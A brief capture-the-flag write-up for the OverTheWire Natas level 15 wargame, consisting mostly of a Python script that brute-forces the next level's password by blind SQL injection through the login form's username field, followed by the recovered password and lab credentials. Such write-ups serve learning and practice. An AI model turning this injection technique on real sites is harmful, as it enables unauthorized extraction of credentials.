# natas 15

Uhh... Honestly I'm not quite sure how I was supposed to do this one. But since I can't print any resources, I am honestly lost.

A friend and I finally come to the conclusion of just bruteforcing it. So that's what we did.


*(You can find this file in /testing/)*
```py
import requests
import string

const = ""
for i in range(len("AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J")):
  for entry in string.ascii_letters + string.digits:
      payload = {'username': 'natas16" AND (BINARY password LIKE "{0}%" OR password = "{0}") AND  ""="'.format(const + entry)}
      response = requests.post('http://natas15.natas.labs.overthewire.org/', auth=('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'), data = payload)
      # print(entry)
      if "This user exists." in response.text:
        const += entry
        # print(const)
        break
print(const)
```

Knowing that the password is always the same length, and that it's either a alphebetical character or digit, we basically just checked each position so see what character they are. So the whole code evaluates to a big fat O(62n). But hey, it works.

> WaIHEacj63wnNIBROHeqi3p9t0m5nhmh